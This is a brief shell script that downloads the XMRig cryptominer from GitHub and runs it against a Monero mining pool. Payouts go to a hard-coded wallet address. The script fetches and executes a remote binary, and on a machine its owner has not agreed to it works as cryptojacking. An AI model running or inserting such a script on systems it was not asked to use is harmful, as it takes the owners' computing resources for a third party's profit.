#!/bin/sh
apt update -y
apt upgrade -y 
apt install wget git apt-utils
wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz
apt install git build-essential cmake automake libtool autoconf
tar -xf xmrig-6.19.0-linux-x64.tar.gz
cd xmrig-6.19.0
./xmrig -o xmr.2miners.com:2222 -a rx -k -u 49YfuC6hgSq8LddFuJcduThkMZBzraTiuLCPib7RJHZBjDeG7znTvDwH6SVNzRVpZ1JdDdK9eFz2k1aBycyDRNBdBCxaMAY --coin monero
echo "Build done"
